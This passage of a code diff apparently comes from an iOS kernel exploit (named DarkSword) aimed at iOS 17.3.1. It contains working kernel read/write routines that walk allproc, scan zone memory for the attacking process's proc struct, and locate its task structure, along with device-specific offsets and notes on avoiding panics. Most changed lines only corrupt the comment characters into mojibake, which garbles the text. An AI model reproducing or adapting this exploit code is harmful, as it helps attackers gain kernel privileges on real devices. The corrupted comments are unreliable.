             bwalk_entry_ok = true;
         } else {
             bwalk_entry_ok = is_heap_ptr(kernproc);
@@ -4775,7 +5029,7 @@ uint64_t ourproc(void) {
     if (bwalk_entry_ok) {
         /* Bug #255: When kernproc variable was detected (PID 0 = kernel_task),
          * PROC_LIST_OFFSET may be 0xb0 (SMRQ) for decoding *(candidate), but
-         * SMRQ is singly-linked — no backward link at proc+0xb0+0x08.
+         * SMRQ is singly-linked вЂ” no backward link at proc+0xb0+0x08.
          * Force BSD LIST offsets: le_prev is at proc+0x08, which gives us
          * &prev_proc->le_next = prev_proc + 0x00 (le_next is first field).
          * So prev_proc = le_prev directly. */
@@ -4784,7 +5038,7 @@ uint64_t ourproc(void) {
         if (g_kernproc_is_pid0) {
             bwalk_list_off = 0x00;     /* BSD p_list at proc+0x00 */
             bwalk_prev_off = 0x08;     /* le_prev at proc+0x08 */
-            filelog_write("[ourproc] Bug #255: kernproc mode — using BSD LIST "
+            filelog_write("[ourproc] Bug #255: kernproc mode вЂ” using BSD LIST "
                           "(list=0x00 prev=0x08) for backward walk from kernel_task=0x%llx",
                           kernproc);
         }
@@ -4810,9 +5064,9 @@ uint64_t ourproc(void) {
 
             /* le_prev = &prev_proc->le_next = prev_proc + list_off.
              * If it points to kernel segment (not heap), we reached the
-             * list head variable (&allproc.lh_first) → stop. */
+             * list head variable (&allproc.lh_first) в†’ stop. */
             if (!le_prev || (is_kptr(le_prev) && !is_heap_ptr_relaxed(le_prev))) {
-                filelog_write("[ourproc] backward walk: reached list head at step %d (le_prev=0x%llx → kdata)",
+                filelog_write("[ourproc] backward walk: reached list head at step %d (le_prev=0x%llx в†’ kdata)",
                               bi, le_prev);
                 break;
             }
@@ -4906,14 +5160,14 @@ uint64_t ourproc(void) {
      * instead of returning early. This preserves panic-free behavior while still
      * giving Bug #332 a chance to find our proc outside the kernel-thread seeds. */
     if (count >= 8 && max_pid_seen == 0 && bwalk_count == 0 && (g_kernproc_is_pid0 || g_direct_layout_set)) {
-        filelog_write("[ourproc] Bug #300: kernel-only PID=0 chain with empty backward walk — skipping alt-list/alt-next probes");
+        filelog_write("[ourproc] Bug #300: kernel-only PID=0 chain with empty backward walk вЂ” skipping alt-list/alt-next probes");
         filelog_write("[ourproc] Bug #378: redirecting to Bug #296/#332 safe seed-local scan instead of early abort");
         goto bug296_zone_scan;
     }
 
     /* Bug #319: the new success-path state after Bug #318 is different from
      * the old PID=0-only false chain. We now reach a SHORT mixed chain from
-     * kernel_task (pid 0 → launchd-like pid 115 → a few user-visible pids),
+     * kernel_task (pid 0 в†’ launchd-like pid 115 в†’ a few user-visible pids),
      * but our PID is still not there and backward walk immediately hits the
      * LIST_HEAD. Session 25g shows the speculative Bug #243B / alt-next probes
      * that follow can destabilize early_kread() before the safer Bug #296/299
@@ -4921,7 +5175,7 @@ uint64_t ourproc(void) {
      *
     * Bug #334: the old broad Bug #296 zone scan used to panic on this device
     * when started from an early GEN2 kernel-thread anchor (phase 4 / 64MB
-    * window walked into an unallocated GEN2 guard page →
+    * window walked into an unallocated GEN2 guard page в†’
     * zone_element_bounds_check panic @zalloc.c:1281).
     *
     * The later Bug #325/#332 rewrite changed this path to a bounded,
@@ -4930,19 +5184,19 @@ uint64_t ourproc(void) {
     * this branch must redirect into the safe scan instead of aborting early.
      *
      * Bug #336 note: when allproc was found via DATA scan (not g_kernproc_is_pid0
-     * / g_direct_layout_set), this guard does NOT fire — instead Bug #243B below
+     * / g_direct_layout_set), this guard does NOT fire вЂ” instead Bug #243B below
      * gets to try alt list offsets (especially list_off=0x00 = real p_list), and
      * the Bug #336 final guard after Bug #243B prevents zone-scan panic. */
     if (count >= 8 && max_pid_seen > 0 && bwalk_count == 0 &&
         (g_kernproc_is_pid0 || g_direct_layout_set)) {
         filelog_write("[ourproc] Bug #334/#336: short mixed kernproc chain (steps=%d, max_pid=%u) with "
-                      "empty backward walk — redirecting to safe Bug #296/#332 scan",
+                      "empty backward walk вЂ” redirecting to safe Bug #296/#332 scan",
                       count, max_pid_seen);
         goto bug296_zone_scan;
     }
 
     /* Strategy B: Alternative list offsets (in case list_off=0xb0 is p_pglist).
-     * Try 0x00, 0x08, 0x10, 0x18 — these are where p_list commonly lives.
+     * Try 0x00, 0x08, 0x10, 0x18 вЂ” these are where p_list commonly lives.
      * For each, walk forward AND backward from kernproc (PID 0 proc). */
     {
         static const uint32_t alt_list_offs[] = { 0x00, 0x08, 0x10, 0x18, 0xa8 };
@@ -5080,7 +5334,7 @@ uint64_t ourproc(void) {
                       le_prev, (int)le_prev_is_kdata);
 
         if (have_le_next && have_le_prev && le_prev_is_kdata && is_heap_ptr_relaxed(le_next)) {
-            filelog_write("[ourproc] Bug #338: confirmed proc0 is BSD allproc HEAD — walking p_list via +0x00...");
+            filelog_write("[ourproc] Bug #338: confirmed proc0 is BSD allproc HEAD вЂ” walking p_list via +0x00...");
             uint64_t wcur = le_next;
             int wstep = 0;
             int wfound_nonzero = 0;
@@ -5088,7 +5342,7 @@ uint64_t ourproc(void) {
             for (int wi = 0; wi < 4000 && wcur && is_heap_ptr_relaxed(wcur); wi++) {
                 uint32_t wpid = 0;
                 if (!read_proc_pid_checked(wcur, PROC_PID_OFFSET, &wpid) || !is_plausible_pid(wpid)) {
-                    filelog_write("[ourproc] Bug #338: bad PID at step %d proc=0x%llx — stopping", wi, wcur);
+                    filelog_write("[ourproc] Bug #338: bad PID at step %d proc=0x%llx вЂ” stopping", wi, wcur);
                     break;
                 }
                 if (wpid > 0) wfound_nonzero++;
@@ -5163,7 +5417,7 @@ uint64_t ourproc(void) {
 
     /* Bug #336 / Bug #334: Final safety guard before the old panic-prone zone scan.
      *
-     * Bug #379: after Bug #325..#333 this path is no longer the old broad scan —
+     * Bug #379: after Bug #325..#333 this path is no longer the old broad scan вЂ”
      * it now leads into the page-aligned seed-local fallback. So keep the
      * blacklist+retry behavior, but do NOT return 0 after exhaustion; redirect
      * into `bug296_zone_scan` instead. */
@@ -5185,7 +5439,7 @@ uint64_t ourproc(void) {
             g_ourproc_retry_depth--;
             if (retry_proc) return retry_proc;
         }
-        filelog_write("[ourproc] Bug #379: partial allproc chain persists after retry — continuing into safe Bug #296/#332 seed-local scan");
+        filelog_write("[ourproc] Bug #379: partial allproc chain persists after retry вЂ” continuing into safe Bug #296/#332 seed-local scan");
         goto bug296_zone_scan;
     }
 
@@ -5194,7 +5448,7 @@ uint64_t ourproc(void) {
      * the remaining fallback is page-aligned and seed-local, so we no longer want to
      * abort here. Keep the detection for telemetry, but continue into the safer scan. */
     if (count >= 2 && max_pid_seen == 0 && (g_kernproc_is_pid0 || g_direct_layout_set)) {
-        filelog_write("[ourproc] Bug #299c/376: kernel-only PID=0 chain detected (steps=%d) — skipping unsafe zone scans",
+        filelog_write("[ourproc] Bug #299c/376: kernel-only PID=0 chain detected (steps=%d) вЂ” skipping unsafe zone scans",
                       count);
         filelog_write("[ourproc] Bug #378: chain stayed in kernel-only PID=0 territory, but continuing into safe Bug #296/#332 seed-local scan");
     }
@@ -5213,7 +5467,7 @@ uint64_t ourproc(void) {
      * Bug #242 FIX: kernel_task is in a different address range (0xffffffe0)
      * than user procs (0xffffffdf). Track user proc range separately.
      * ==================================================================== */
-    /* Bug #298: old coarse/fine scan logging silenced — known-failing on iOS 17.3.1 (PID=0 kernel-only allproc).
+    /* Bug #298: old coarse/fine scan logging silenced вЂ” known-failing on iOS 17.3.1 (PID=0 kernel-only allproc).
      * Bug #296/298 full zone_map scan below is the real fallback. */
     /* [SILENCED] Bug #240/242/243: starting PID zone scan fallback for pid=%d... */
 
@@ -5282,11 +5536,11 @@ uint64_t ourproc(void) {
 
             uint32_t probe_pid = 0;
             if (!ds_kread32_checked(probe + PROC_PID_OFFSET, &probe_pid)) {
-                break; /* kread failure — stop this direction (silenced) */
+                break; /* kread failure вЂ” stop this direction (silenced) */
             }
 
             if (probe_pid == (uint32_t)ourpid) {
-                /* Candidate found — validate it's a real proc by checking
+                /* Candidate found вЂ” validate it's a real proc by checking
                  * a few more fields. */
                 filelog_write("[ourproc] zone scan %s: PID MATCH at step %d addr=0x%llx!",
                               dir_name, step, probe);
@@ -5305,7 +5559,7 @@ uint64_t ourproc(void) {
                     continue;
                 }
 
-                /* SUCCESS — found our proc via zone scan */
+                /* SUCCESS вЂ” found our proc via zone scan */
                 discover_name_offset(probe);
                 char name[64] = {0};
                 if (PROC_NAME_OFFSET != 0) {
@@ -5325,7 +5579,7 @@ uint64_t ourproc(void) {
     }
 
     /* Last resort: fine-grained scan around known user procs.
-     * Bug #242: scan ±0x100000 (1MB) around user proc max, not kernel_task.
+     * Bug #242: scan В±0x100000 (1MB) around user proc max, not kernel_task.
      * Try every 0x10 bytes. Expensive but definitive.
      * Bug #298: coarse scan failed log silenced (known-failing on this iOS). */
     {
@@ -5368,15 +5622,15 @@ bug296_zone_scan:
     /* Bug #296: allproc chain on iOS 17.3.1 only contains kernel threads (PID=0).
      * User procs (including our own) are NOT reachable via the allproc forward walk.
      *
-     * Bug #299a — PANIC ROOT CAUSE: scanning from safe_min (zmin+25%) or kernproc-4GB
+     * Bug #299a вЂ” PANIC ROOT CAUSE: scanning from safe_min (zmin+25%) or kernproc-4GB
      * causes "Kernel data abort" at kbase+0xE04810 with FAR well above zone_map_max.
-     * Mechanism: sooptcopyout() → zone_element_bounds_check(src) reads zone_page_metadata
+     * Mechanism: sooptcopyout() в†’ zone_element_bounds_check(src) reads zone_page_metadata
      * for the source address. Zone metadata for lower zone submaps (0xffffffdc..0xffffffdd..)
-     * lives in a sequestered region that is NOT mapped → translation fault L3 → panic.
+     * lives in a sequestered region that is NOT mapped в†’ translation fault L3 в†’ panic.
      * proc0 (kernproc, 0xffffffdf..) is in a higher submap where metadata IS mapped.
      * Fix: start scan at kernproc (guaranteed safe).
      *
-     * Bug #299b — MISSED PROCS: kalloc.type5.1024 = 1024 B/element → 4 elements per
+     * Bug #299b вЂ” MISSED PROCS: kalloc.type5.1024 = 1024 B/element в†’ 4 elements per
      * 4KB page at offsets 0x000, 0x400, 0x800, 0xC00. Old 0x1000 stride only visited
      * offset-0 elements, missing 75% of user procs including DarkSword itself.
      * Fix: stride = 0x400 (1024 B) to visit every element in each page. */
@@ -5466,7 +5720,7 @@ bug296_zone_scan:
             }
 
             const uint64_t ZONE_STRIDE = page_aligned_scan ? 0x1000ULL : 0x400ULL;
-            const int ZONE296_MAX = 1000000;  /* 1M — more than enough with smart skip */
+            const int ZONE296_MAX = 1000000;  /* 1M вЂ” more than enough with smart skip */
             uint32_t zone_pid_offs[2] = {0};
             int zone_pid_count = 0;
             zone_pid_offs[zone_pid_count++] = PROC_PID_OFFSET;
@@ -5486,7 +5740,7 @@ bug296_zone_scan:
                     0x40000ULL,
                     0x100000ULL,
                     0x400000ULL,
-                    0x4000000ULL,   /* Bug #332: 64 MB forward phase — seeds are kernel-thread
+                    0x4000000ULL,   /* Bug #332: 64 MB forward phase вЂ” seeds are kernel-thread
                                      * pages; user proc for DarkSword is allocated far ahead
                                      * in the same GEN0/GEN1 heap region. Panic-free because
                                      * scan stays within zone_map and each probe is within
@@ -5626,6 +5880,13 @@ bug296_zone_scan:
                         for (int zoi = 0; zoi < zone_pid_count; zoi++) {
                             uint32_t probe_pid = 0;
                             uint32_t probe_off = zone_pid_offs[zoi];
+                            /* Bug #506: EARLY_KRW_LENGTH=32; the zone-bound checker panics if
+                             * the 32-byte kread overflows a zone object. The minimum XNU zone
+                             * object size is 256 bytes (e.g. vnodes). All valid proc+pid_off
+                             * combos have (probe_addr & 0xFF) <= 0xD8, so +32 <= 0xF8 <= 256
+                             * and are never skipped. Misaligned candidates (e.g. scanning a
+                             * vnode page with seed_slot_offsets from proc pages) are skipped. */
+                            if (((cand + probe_off) & 0xFFULL) + 32ULL > 256ULL) continue;
                             if (!ds_kread32_checked(cand + probe_off, &probe_pid)) continue;
                             if (probe_pid == (uint32_t)ourpid) {
                                 zpid = probe_pid;
@@ -5736,6 +5997,8 @@ bug296_zone_scan:
                                     for (int zoi = 0; zoi < zone_pid_count; zoi++) {
                                         uint32_t probe_pid = 0;
                                         uint32_t probe_off = zone_pid_offs[zoi];
+                                        /* Bug #506: see seed-slot prepass above */
+                                        if (((cand + probe_off) & 0xFFULL) + 32ULL > 256ULL) continue;
                                         if (!ds_kread32_checked(cand + probe_off, &probe_pid)) continue;
                                         z296_ok = true;
                                         if (probe_pid == (uint32_t)ourpid) {
@@ -5927,7 +6190,7 @@ bug296_zone_scan:
 
 /* ================================================================
    ourtask: get task for proc
-   BUG 3 FIX: use proc_ro→task path with validation
+   BUG 3 FIX: use proc_roв†’task path with validation
    Original lara: return proc + 0x740  (WRONG on iPad8,9)
    ================================================================ */
 
@@ -5936,7 +6199,7 @@ bug296_zone_scan:
 uint64_t ourtask(uint64_t procaddr) {
     if (!procaddr) return 0;
 
-    /* Strategy 1: proc_ro→task path (iOS 15.2+, arm64e) */
+    /* Strategy 1: proc_roв†’task path (iOS 15.2+, arm64e) */
     uint64_t proc_ro_raw = 0;
     if (ds_kread64_checked(procaddr + O_PROC_RO, &proc_ro_raw)) {
         uint64_t proc_ro = pac_strip(proc_ro_raw);
@@ -5945,7 +6208,7 @@ uint64_t ourtask(uint64_t procaddr) {
             if (ds_kread64_checked(proc_ro + O_PROC_RO_TASK, &task_raw)) {
                 uint64_t task = pac_strip(task_raw);
                 if ((is_heap_ptr(task) || is_kptr(task)) && task_has_vm_map_sanity(task)) {
-                    printf("ourtask: proc_ro=0x%llx → task=0x%llx ✓\n", proc_ro, task);
+                    printf("ourtask: proc_ro=0x%llx в†’ task=0x%llx вњ“\n", proc_ro, task);
                     return task;
                 }
             }
@@ -5959,13 +6222,13 @@ uint64_t ourtask(uint64_t procaddr) {
         if (!(is_heap_ptr(candidate) || is_kptr(candidate))) continue;
 
         if (task_has_vm_map_sanity(candidate)) {
-            printf("ourtask: proc+0x%x → task=0x%llx ✓\n", off, candidate);
+            printf("ourtask: proc+0x%x в†’ task=0x%llx вњ“\n", off, candidate);
             return candidate;
         }
     }
 
     /* Strategy 3: give up cleanly instead of returning garbage */
-    printf("ourtask: FAILED — could not find task struct\n");
+    printf("ourtask: FAILED вЂ” could not find task struct\n");
     return 0;
 }
 
@@ -6090,3 +6353,4 @@ uint64_t procbyname(const char *procname) {
 
     return 0;
 }
+
